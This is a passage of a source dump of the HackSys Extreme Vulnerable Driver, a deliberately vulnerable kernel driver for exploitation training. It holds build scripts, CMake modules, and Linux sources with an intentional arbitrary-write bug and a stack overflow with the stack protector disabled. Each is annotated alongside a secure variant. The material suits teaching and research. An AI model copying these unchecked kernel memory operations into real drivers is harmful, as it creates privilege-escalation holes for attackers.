rem VS2017U2 contains vswhere.exe
if "%VSWHERE%"=="" (
    set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
)

for /f "usebackq tokens=*" %%i in (`"%VSWHERE%" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath`) do (
    set VS_INSTALL_DIR=%%i
)

echo [+] Visual Studio Path: %VS_INSTALL_DIR%

set VSDEVCMD_PATH=%VS_INSTALL_DIR%\Common7\Tools\VsDevCmd.bat

echo [+] Executing: %VSDEVCMD_PATH%

echo.
@call "%VSDEVCMD_PATH%" -arch=%BUILD_ARCH%
echo.

echo [+] Build target architecture: %BUILD_ARCH%
echo [+] Host Architecture: %PROCESSOR_ARCHITECTURE%
echo [+] Build directory: %BUILD_DIR%
echo [+] Removing build directory

if exist %BUILD_DIR% (
    rmdir /S /Q "%BUILD_DIR%"
)

echo [+] Creating build directory

mkdir "%BUILD_DIR%"
cd %BUILD_DIR%

echo [+] Generating build configuration files

cmake.exe -G "Ninja" -DCMAKE_INSTALL_PREFIX:PATH="%BUILD_DIR%" -DCMAKE_BUILD_TYPE="Release" "%PROJECT_DIR%"

echo.
echo [+] Building vulnerable HackSys Extreme Vulnerable Driver
echo.

CMake.exe --build "%BUILD_DIR%" --config Release --clean-first -- "-v"
echo.

echo [+] Copying built files

echo [*] %PROJECT_NAME%.sys
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.sys" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.pdb
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.pdb" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.cat
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.cat" "%BUILD_DIR%"

echo [*] %PROJECT_NAME%.inf
move /Y "%BUILD_DIR%\%PROJECT_NAME%\Windows\%PROJECT_NAME%.inf" "%BUILD_DIR%"
echo.


echo [+] Cleaning build directory
for /r "%BUILD_DIR%" %%a in (*) do (
    if not %%~xa==.sys (
        if not %%~xa==.pdb (
            if not %%~xa==.inf (
                if not %%~xa==.cat (
                    del /f /q "%%a"
                )
            )
        )
    )
)

rmdir /S /Q "%BUILD_DIR%\%PROJECT_NAME%"
rmdir /S /Q "%BUILD_DIR%\CMakeFiles"
echo.

echo [+] Built vulnerable HackSys Extreme Vulnerable Driver successfully
cd %CURRENT_DIR%
echo.

```

`CONTRIBUTING.md`:

```md
Contributing to HackSys Extreme Vulnerable Driver
=================================================

To contribute code to **HackSys Extreme Vulnerable Driver (HEVD)** project, please use pull requests via **GitHub**.

## Thank you


------------------------------------------------------------------------

[![HackSys Inc](https://hacksys.io/android-chrome-192x192.png "HackSys Inc")](https://hacksys.io)

```

`Driver/CMake/DetectOS.cmake`:

```cmake
#
# This script is used to detect the OS and architecture of the host system
#

# Detect host architecture
if(CMAKE_C_PLATFORM_ID STREQUAL "Windows")
    if(CMAKE_C_COMPILER_ARCHITECTURE_ID STREQUAL "X86")
        set(HOST_ARCH_X86 TRUE BOOL)
        set(HOST_PLATFORM "x86")
    elseif(CMAKE_C_COMPILER_ARCHITECTURE_ID STREQUAL "x64")
        set(HOST_ARCH_X64 TRUE BOOL)
        set(HOST_PLATFORM "x64")
    elseif(CMAKE_C_COMPILER_ARCHITECTURE_ID STREQUAL "ARM64")
        set(HOST_ARCH_ARM64 TRUE BOOL)
        set(HOST_PLATFORM "arm64")
    endif()
elseif(CMAKE_C_PLATFORM_ID STREQUAL "Linux")
    if(CMAKE_SIZEOF_VOID_P EQUAL 4)
        set(HOST_ARCH_X86 TRUE BOOL)
        set(HOST_PLATFORM "x86")
    elseif(CMAKE_SIZEOF_VOID_P EQUAL 8)
        set(HOST_ARCH_X64 TRUE BOOL)
        set(HOST_PLATFORM "x64")
    endif()
endif()

# Detect host operating system
string(REGEX MATCH "Linux" HOST_OS_LINUX ${CMAKE_SYSTEM_NAME})

if(WIN32)
    set(HOST_OS_WINDOWS TRUE BOOL)
endif()

```

`Driver/CMake/LKM.cmake`:

```cmake
#
# Linux Kernel Module Builder
#

# set the kernel build directory
set(KERNEL_DIR "/lib/modules/${CMAKE_HOST_SYSTEM_VERSION}/build")

message(STATUS "KERNEL_VERSION: ${CMAKE_HOST_SYSTEM_VERSION}")
message(STATUS "KERNEL_DIR: ${KERNEL_DIR}")


function(lkm_add_driver)
    cmake_parse_arguments(LKM "" "NAME" "" ${ARGN})

    # validate the module name
    if(NOT LKM_NAME)
        message(FATAL_ERROR "You should give a name to the module")
        return()
    else()
        string(TOLOWER ${LKM_NAME} MODULE_NAME)
    endif()

    # set the Kbuild command and file path
    set(KBUILD_COMMAND ${CMAKE_MAKE_PROGRAM} -C ${KERNEL_DIR} M=${CMAKE_BINARY_DIR} src=${CMAKE_SOURCE_DIR}/HEVD/${CMAKE_SYSTEM_NAME})
    
    set(KBUILD_FILE_PATH "${CMAKE_SOURCE_DIR}/HEVD/${CMAKE_SYSTEM_NAME}/Kbuild")

    # delete the obsolete Kbuild file if exists
    if(EXISTS ${KBUILD_FILE_PATH})
        message(STATUS "Deleting obsolete Kbuild: ${KBUILD_FILE_PATH}")
        file(REMOVE ${KBUILD_FILE_PATH})
    endif()

    # add the source object files to the Kbuild file
    foreach(MODULE_SOURCE_FILE ${LKM_UNPARSED_ARGUMENTS})
        get_filename_component(SOURCE_FILE ${MODULE_SOURCE_FILE} NAME_WE)
        file(APPEND ${KBUILD_FILE_PATH} "${MODULE_NAME}-m += ${SOURCE_FILE}.o\n")
    endforeach()

    file(APPEND ${KBUILD_FILE_PATH} "obj-m += ${MODULE_NAME}.o\n")

    # disable -Wframe-larger-than= warning in GCC
    file(APPEND ${KBUILD_FILE_PATH} "ccflags-y := -Wframe-larger-than=65535\n")

    # if we are building secure version, then set the flag
    if(SECURE)
        file(APPEND ${KBUILD_FILE_PATH} "ccflags-y += -DSECURE\n")
    endif()

    message(STATUS "Wrote new Kbuild: ${KBUILD_FILE_PATH}")

    # set the output module path
    set(MODULE_BIN_FILE "${CMAKE_BINARY_DIR}/${MODULE_NAME}.ko")
    
    add_custom_target(
        ${MODULE_NAME}
        ALL COMMAND ${KBUILD_COMMAND} modules
        COMMENT "Compiling Linux Kernel Module: ${MODULE_BIN_FILE}"
    )

    set_property(DIRECTORY APPEND PROPERTY ADDITIONAL_MAKE_CLEAN_FILES ${KBUILD_FILE_PATH} ${CMAKE_BINARY_DIR})
    
endfunction()

```

`Driver/CMake/WDK.cmake`:

```cmake
#
# Windows Driver Builder using WDK
#
# Modified from: https://github.com/SergiusTheBest/FindWDK
#

# clear some flags
set(CMAKE_C_FLAGS "")
set(CMAKE_C_FLAGS_RELEASE "")
set(CMAKE_CREATE_CONSOLE_EXE "")
set(CMAKE_CREATE_WIN32_EXE "")
set(CMAKE_C_STANDARD_LIBRARIES "")


# find Windows Kits root path from registry
get_filename_component(
    KITS_ROOT
    "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Kits\\Installed Roots;KitsRoot10]"
    ABSOLUTE
    CACHE
)

# find ntddk.h
if(KITS_ROOT)
    file(GLOB WDK_NTDDK_FILES "${KITS_ROOT}/Include/*/km/ntddk.h")
elseif(DEFINED $ENV{WDKContentRoot})
    file(GLOB WDK_NTDDK_FILES "$ENV{WDKContentRoot}/Include/*/km/ntddk.h")
else()
    file(GLOB WDK_NTDDK_FILES "C:/Program Files*/Windows Kits/*/Include/*/km/ntddk.h")
endif()

if(WDK_NTDDK_FILES)
    list(GET WDK_NTDDK_FILES -1 WDK_LATEST_NTDDK_FILE)
endif()


include(FindPackageHandleStandardArgs)
find_package_handle_standard_args(WDK REQUIRED_VARS WDK_LATEST_NTDDK_FILE)

if (NOT WDK_LATEST_NTDDK_FILE)
    message(FATAL_ERROR "Unable to locate ntddk.h")
    return()
endif()

# get WDK version and root path
get_filename_component(WDK_ROOT ${WDK_LATEST_NTDDK_FILE} DIRECTORY)
get_filename_component(WDK_ROOT ${WDK_ROOT} DIRECTORY)
get_filename_component(WDK_VERSION ${WDK_ROOT} NAME)
get_filename_component(WDK_ROOT ${WDK_ROOT} DIRECTORY)
get_filename_component(WDK_ROOT ${WDK_ROOT} DIRECTORY)

message(STATUS "WDK_ROOT: ${WDK_ROOT}")
message(STATUS "WDK_VERSION: ${WDK_VERSION}")

# location of warning.h
set(WDK_WARNING_H_FILE "${WDK_ROOT}/Include/${WDK_VERSION}/shared/warning.h")
set(WDK_COMPILE_FLAGS
    "/Zi"
    "/W4"
    "/WX"
    "/diagnostics:classic"
    "/Ox"
    "/Os"
    "/Oy-"
    "/GF"
    "/Gm-"
    "/Zp8"
    "/GS"
    "/Gy"
    "/fp:precise"
    "/Zc:wchar_t-"
    "/Zc:forScope"
    "/Zc:inline"
    "/GR-"
    "/wd4603"
    "/wd4627"
    "/wd4986"
    "/wd4987"
    "/wd4996"
    "/FC"
    "/errorReport:prompt"
    "/kernel"
    "-cbstring"
    "/d1nodatetime"
    "/d1import_no_registry"
    "/d2AllowCompatibleILVersions"
    "/d2Zi+"
    "/Qspectre"
    "/FI${WDK_WARNING_H_FILE}"
)
set(WDK_WINVER "0x0601" CACHE STRING "Default WINVER for WDK targets")
set(WDK_COMPILE_DEFINITIONS "WINNT=1;NTDDI_VERSION=0x06010000;WINVER=${WDK_WINVER}")
set(WDK_COMPILE_DEFINITIONS_DEBUG "MSC_NOOPT;DEPRECATE_DDK_FUNCTIONS=1;DBG=1")

# adjust the comile definitions depending on the compile target architecture
if(HOST_ARCH_X86)
    list(APPEND WDK_COMPILE_FLAGS "/Gz")
    list(APPEND WDK_COMPILE_DEFINITIONS "_X86_=1;i386=1;STD_CALL;")
elseif(HOST_ARCH_X64)
    list(APPEND WDK_COMPILE_FLAGS "/Gz")
    list(APPEND WDK_COMPILE_FLAGS "-d2epilogunwind")
    list(APPEND WDK_COMPILE_DEFINITIONS "_WIN64;_AMD64_;AMD64;")
elseif(HOST_ARCH_ARM64)
    list(APPEND WDK_COMPILE_DEFINITIONS "_ARM64_;ARM64;_USE_DECLSPECS_FOR_SAL=1;STD_CALL;")
else()
    message(FATAL_ERROR "Unsupported architecture")
    return()
endif()

string(CONCAT WDK_LINK_FLAGS
    "/MANIFEST:NO "
    "/PROFILE "
    "/RELEASE "
    "/DEBUG "
    "/WX "
    "/Driver "
    "/OPT:REF "
    "/OPT:ICF "
    "/INCREMENTAL:NO "
    "/SUBSYSTEM:NATIVE,6.01 "
    "/MERGE:_TEXT=.text;_PAGE=PAGE "
    "/NODEFAULTLIB "
    "/SECTION:INIT,d "
    "/kernel "
    "/IGNORE:4198,4010,4037,4039,4065,4070,4078,4087,4089,4221,4108,4088,4218,4218,4235 "
    "/osversion:10.0 "
    "/pdbcompress "
    "/debugtype:pdata "
)

# Generate imported targets for WDK lib files
file(GLOB WDK_KM_LIBS "${WDK_ROOT}/Lib/${WDK_VERSION}/km/${HOST_PLATFORM}/*.lib")
file(GLOB WDK_UM_LIBS "${WDK_ROOT}/Lib/${WDK_VERSION}/um/${HOST_PLATFORM}/*.lib")

foreach(LIBRARY IN LISTS WDK_KM_LIBS)
    get_filename_component(LIBRARY_NAME ${LIBRARY} NAME_WLE)
    string(TOUPPER ${LIBRARY_NAME} LIBRARY_NAME)
    add_library(WDK_KM::${LIBRARY_NAME} INTERFACE IMPORTED)
    set_property(TARGET WDK_KM::${LIBRARY_NAME} PROPERTY INTERFACE_LINK_LIBRARIES ${LIBRARY})
endforeach(LIBRARY)

foreach(LIBRARY IN LISTS WDK_UM_LIBS)
    get_filename_component(LIBRARY_NAME ${LIBRARY} NAME_WLE)
    string(TOUPPER ${LIBRARY_NAME} LIBRARY_NAME)
    add_library(WDK_UM::${LIBRARY_NAME} INTERFACE IMPORTED)
    set_property(TARGET WDK_UM::${LIBRARY_NAME} PROPERTY INTERFACE_LINK_LIBRARIES ${LIBRARY})
endforeach(LIBRARY)

unset(WDK_KM_LIBS)
unset(WDK_UM_LIBS)

function(wdk_add_driver _target)
    cmake_parse_arguments(WDK "" "WDM;PFX_FILE;PFX_PASSWORD" "" ${ARGN})

    add_executable(${_target} ${WDK_UNPARSED_ARGUMENTS})

    set_target_properties(${_target} PROPERTIES SUFFIX ".sys")
    set_target_properties(${_target} PROPERTIES COMPILE_OPTIONS "${WDK_COMPILE_FLAGS}")
    set_target_properties(${_target} PROPERTIES COMPILE_DEFINITIONS
        "${WDK_COMPILE_DEFINITIONS};$<$<CONFIG:Debug>:${WDK_COMPILE_DEFINITIONS_DEBUG}>;_WIN32_WINNT=${WDK_WINVER}"
    )
    set_target_properties(${_target} PROPERTIES LINK_FLAGS "${WDK_LINK_FLAGS}")
    set_target_properties(${_target} PROPERTIES VERSION "${HEVD_VERSION}")

    target_include_directories(${_target} SYSTEM PRIVATE
        "${WDK_ROOT}/Include/${WDK_VERSION}/shared"
        "${WDK_ROOT}/Include/${WDK_VERSION}/km"
    )

    target_link_libraries(${_target} WDK_KM::NTOSKRNL WDK_KM::HAL WDK_KM::WMILIB)

    if(HOST_ARCH_X86)
        target_link_libraries(${_target} WDK_KM::BUFFEROVERFLOWK WDK_KM::MEMCMP)
    elseif(HOST_ARCH_X64)
        target_link_libraries(${_target} WDK_KM::BUFFEROVERFLOWK)
    elseif(HOST_ARCH_ARM64)
        target_link_libraries(${_target} WDK_KM::BUFFEROVERFLOWFASTFAILK WDK_UM::ARM64RT)
    endif()

    if(HOST_ARCH_X86)
        set_property(TARGET ${_target} APPEND_STRING PROPERTY LINK_FLAGS "/ENTRY:GsDriverEntry@8")
    elseif(HOST_ARCH_X64)
        set_property(TARGET ${_target} APPEND_STRING PROPERTY LINK_FLAGS "/ENTRY:GsDriverEntry")
    elseif(HOST_ARCH_ARM64)
        set_property(TARGET ${_target} APPEND_STRING PROPERTY LINK_FLAGS "/ENTRY:GsDriverEntry")
    else()
        message(FATAL_ERROR "Unsupported architecture")
        return()
    endif()

    set(PROJECT_INF_PATH "${PROJECT_SOURCE_DIR}\\${CMAKE_PROJECT_NAME}\\${CMAKE_SYSTEM_NAME}\\${CMAKE_PROJECT_NAME}.inf")
    set(PROJECT_PFX_PATH "${PROJECT_SOURCE_DIR}\\${CMAKE_PROJECT_NAME}\\${CMAKE_SYSTEM_NAME}\\${WDK_PFX_FILE}")

    message(STATUS "PROJECT_INF_PATH: ${PROJECT_INF_PATH}")
    message(STATUS "PROJECT_PFX_PATH: ${PROJECT_PFX_PATH}")

    # stampinf.exe Configuration
    set(STAMPINF_PATH "${WDK_ROOT}/bin/${WDK_VERSION}/x86/stampinf.exe")

    if(HOST_ARCH_X86)
        set(STAMPINF_ARGS "-k \"1.9\" -d \"*\" -a \"x86\" -v \"${HEVD_VERSION}\" -f ")
    elseif(HOST_ARCH_X64)
        set(STAMPINF_ARGS "-k \"1.9\" -d \"*\" -a \"amd64\" -v \"${HEVD_VERSION}\" -f ")
    elseif(HOST_ARCH_ARM64)
        set(STAMPINF_ARGS "-k \"1.9\" -d \"*\" -a \"arm64\" -v \"${HEVD_VERSION}\" -f ")
    endif()

    add_custom_command(
      COMMENT "Copying inf to build directory"
      TARGET ${_target}
      POST_BUILD
      COMMAND ${CMAKE_COMMAND} -E copy_if_different ${PROJECT_INF_PATH} ${CMAKE_CURRENT_BINARY_DIR}
      VERBATIM
    )

    add_custom_command(
      COMMENT "Stamping driver inf file"
      TARGET ${_target}
      POST_BUILD
      COMMAND ${STAMPINF_PATH} ${STAMPINF_ARGS} "${CMAKE_CURRENT_BINARY_DIR}\\${CMAKE_PROJECT_NAME}.inf"
    )

    # sign the files if certificate is available
    if(EXISTS ${PROJECT_PFX_PATH})
        # signtool.exe Configuration
        set(SIGNTOOL_PATH "${WDK_ROOT}/bin/${WDK_VERSION}/x86/signtool.exe")
        set(SIGNTOOL_ARGS "sign /fd sha1 /f \"${PROJECT_PFX_PATH}\" /p ${WDK_PFX_PASSWORD}")

        add_custom_command(
          COMMENT "Signing driver binary file"
          TARGET ${_target}
          POST_BUILD
          COMMAND ${SIGNTOOL_PATH} ${SIGNTOOL_ARGS} "${CMAKE_CURRENT_BINARY_DIR}\\${CMAKE_PROJECT_NAME}.sys"
        )
    
        # inf2cat Configuration
        set(INF2CAT_PATH "${WDK_ROOT}/bin/${WDK_VERSION}/x86/inf2cat.exe")

        if(HOST_ARCH_ARM64)
            set(INF2CAT_ARGS "/os:\"10_RS3_ARM64\" /driver:\"${CMAKE_CURRENT_BINARY_DIR}\"")
        else()
            set(INF2CAT_ARGS "/os:\"7_${HOST_PLATFORM}\" /driver:\"${CMAKE_CURRENT_BINARY_DIR}\"")
        endif()

        add_custom_command(
          COMMENT "Creating catalog file"
          TARGET ${_target}
          POST_BUILD
          COMMAND ${INF2CAT_PATH} ${INF2CAT_ARGS}
        )

        add_custom_command(
          COMMENT "Signing driver catalog file"
          TARGET ${_target}
          POST_BUILD
          COMMAND ${SIGNTOOL_PATH} ${SIGNTOOL_ARGS} "${CMAKE_CURRENT_BINARY_DIR}\\${CMAKE_PROJECT_NAME}.cat"
        )

    endif()

endfunction()

```

`Driver/CMakeLists.txt`:

```txt
#
# HEVD CMake Script
#

cmake_minimum_required (VERSION 3.8)

message(
"
      ##     ## ######## ##     ## ########
      ##     ## ##       ##     ## ##     ##
      ##     ## ##       ##     ## ##     ##
      ######### ######   ##     ## ##     ##
      ##     ## ##        ##   ##  ##     ##
      ##     ## ##         ## ##   ##     ##
      ##     ## ########    ###    ########

        HackSys Extreme Vulnerable Driver
"
)

project("HEVD" C)

set(HEVD_VERSION "3.0")
list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_LIST_DIR}/CMake")

message("Detecting OS and Architecture")
include(DetectOS)

# validate supported OS
if(HOST_OS_LINUX)
    message(STATUS "OS: Linux")
elseif(HOST_OS_WINDOWS)
    message(STATUS "OS: Windows")
else()
    message(FATAL_ERROR "Unsupported OS")
    return()
endif()

# Validate supported architecture
if(HOST_ARCH_X64)
    message(STATUS "Architecture: x64")
elseif(HOST_ARCH_X86)
    message(STATUS "Architecture: x86")
elseif(HOST_ARCH_ARM64)
    message(STATUS "Architecture: arm64")
else()
    message(FATAL_ERROR "Unsupported architecture")
    return()
endif()

if(HOST_OS_WINDOWS)
    message("Locating Windows Driver Kit")
    include(WDK)
elseif(HOST_OS_LINUX)
    message("Locating Linux Kernel Module Builder")
    include(LKM)
endif()

add_subdirectory("HEVD")

```

`Driver/HEVD/CMakeLists.txt`:

```txt
#
# Intermediate CMakeLists to add OS dependent directories
#

if(HOST_OS_WINDOWS)
    add_subdirectory("Windows")
elseif(HOST_OS_LINUX)
    add_subdirectory("Linux")
endif()

```

`Driver/HEVD/Linux/ArbitraryWrite.c`:

```c
/*++

        ##     ## ######## ##     ## ########
        ##     ## ##       ##     ## ##     ##
        ##     ## ##       ##     ## ##     ##
        ######### ######   ##     ## ##     ##
        ##     ## ##        ##   ##  ##     ##
        ##     ## ##         ## ##   ##     ##
        ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryWrite.c

Abstract:
    This module implements the functions to demonstrate
    arbitrary write vulnerability in the kernel

--*/

#include "ArbitraryWrite.h"


/**
 * @param[in] user_write_what_where the pointer to WRITE_WHAT_WHERE structure
 * @return status code
 */
int trigger_arbitrary_write(PWRITE_WHAT_WHERE user_write_what_where)
{
    void *what = NULL;
    void *where = NULL;
    int status = STATUS_SUCCESS;

    if (!x_access_ok(VERIFY_READ, user_write_what_where, sizeof(WRITE_WHAT_WHERE)))
    {
        ERR("[-] Invalid parameters");

        status = -EINVAL;
        return status;
    }

    what = user_write_what_where->What;
    where = user_write_what_where->Where;

    INFO("[+] user_write_what_where: 0x%p\n", user_write_what_where);
    INFO("[+] WRITE_WHAT_WHERE size: 0x%zX\n", sizeof(WRITE_WHAT_WHERE));
    INFO("[+] user_write_what_where->What: 0x%p\n", what);
    INFO("[+] user_write_what_where->Where: 0x%p\n", where);

#ifdef SECURE
    /**
     * Secure Note: This is secure because the developer is properly validating if address
     * pointed by 'Where' and 'What' value resides in User mode
     */

    if (!x_access_ok(VERIFY_READ, what, sizeof(void *)) ||
        !x_access_ok(VERIFY_WRITE, where, sizeof(void *)))
    {
        ERR("[-] Invalid parameters");

        status = -EINVAL;
        return status;
    }

#endif

    INFO("[+] Triggering Arbitrary Write\n");

    /**
     * Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
     * because the developer is writing the value pointed by 'What' to memory location
     * pointed by 'Where' without properly validating if the values pointed by 'Where'
     * and 'What' resides in User mode
     */

    *((void **) where) = *((void **) what);
    
    return status;
}


/**
 * @param[in] io user space buffer
 * @return status code
 */
int arbitrary_write_ioctl_handler(struct hevd_io *io)
{
    int status = -EINVAL;
    PWRITE_WHAT_WHERE user_write_what_where = NULL;

    user_write_what_where = (PWRITE_WHAT_WHERE)io->input_buffer;

    if (user_write_what_where)
    {
        status = trigger_arbitrary_write(user_write_what_where);
    }

    return status;
}

```

`Driver/HEVD/Linux/ArbitraryWrite.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    ArbitraryWrite.h

Abstract:
    This module implements the data structures for
    arbitrary write module.

--*/

#pragma once

#ifndef __ARBITRARY_WRITE_H__
#define __ARBITRARY_WRITE_H__

#include "Common.h"


//
// Structures
//

typedef struct _WRITE_WHAT_WHERE
{
    void *What;
    void *Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;


//
// Function Definitions
//

int trigger_arbitrary_write(PWRITE_WHAT_WHERE user_write_what_where);

#endif // !__ARBITRARY_WRITE_H__

```

`Driver/HEVD/Linux/BufferOverflowStack.c`:

```c
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
3 of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program.
If not, see <http://www.gnu.org/licenses/>.

THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED
TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

See the file 'LICENSE' for complete copying permission.

Module Name:
    BufferOverflowStack.c

Abstract:
    This module implements the functions to demonstrate
    buffer overflow in Stack vulnerability.

--*/

#include "BufferOverflowStack.h"


/**
 * Trigger the buffer overflow in Stack Vulnerability
 * 
 * @param[in] user_buffer the pointer to user mode buffer
 * @param[in] size size of the user mode buffer
 * @return status code
 */
__attribute__((optimize("-fno-stack-protector")))
int trigger_buffer_overflow_stack(void *user_buffer, size_t size)
{
    int status = STATUS_SUCCESS;
    unsigned long kernel_buffer[BUFFER_SIZE] = { 0 };

    INFO("[+] user_buffer: 0x%p\n", user_buffer);
    INFO("[+] user_buffer size: 0x%zX\n", size);
    INFO("[+] kernel_buffer: 0x%p\n", &kernel_buffer);
    INFO("[+] kernel_buffer size: 0x%zX\n", sizeof(kernel_buffer));

#ifdef SECURE
    /**
     * Secure Note: This is secure because the developer is passing a size
     * equal to size of kernel_buffer to `copy_from_user()`. Hence,
     * there will be no overflow
     */

    if (copy_from_user(kernel_buffer, user_buffer, sizeof(kernel_buffer)))
    {
        status = -EFAULT;
    }
#else
    INFO("[+] Triggering Buffer Overflow in Stack\n");

    /**
     * Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
     * because the developer is passing the user supplied size directly to
     * `__copy_from_user()` without validating if the size is greater or
     * equal to the size of kernel_buffer
     */

    if (__copy_from_user(kernel_buffer, user_buffer, size))
    {
        status = -EFAULT;
    }
#endif
    
    return status;
}


/**
 * Buffer Overflow Stack Ioctl Handler
 * 
 * @param[in] io user space buffer
 * @return status code
 */
int buffer_overflow_stack_ioctl_handler(struct hevd_io *io)
{
    size_t size = 0;
    void *user_buffer = NULL;
    int status = -EINVAL;

    user_buffer = io->input_buffer;
    size = io->input_buffer_length;

    if (user_buffer)
    {
        status = trigger_buffer_overflow_stack(user_buffer, size);
    }

    return status;
}

```

`Driver/HEVD/Linux/BufferOverflowStack.h`:

```h
/*++

          ##     ## ######## ##     ## ########
          ##     ## ##       ##     ## ##     ##
          ##     ## ##       ##     ## ##     ##
          ######### ######   ##     ## ##     ##
          ##     ## ##        ##   ##  ##     ##
          ##     ## ##         ## ##   ##     ##
          ##     ## ########    ###    ########

            HackSys Extreme Vulnerable Driver

Author : Ashfaq Ansari
Contact: ashfaq[at]hacksys[dot]io
Website: https://hacksys.io/

Copyright (C) 2021-2023 HackSys Inc. All rights reserved.
Copyright (C) 2015-2020 Payatu Software Labs LLP. All rights reserved.

This program is free software: you can redistribute it and/or modify it under the terms of
the GNU General Public License as published by the Free Software Foundation, either version
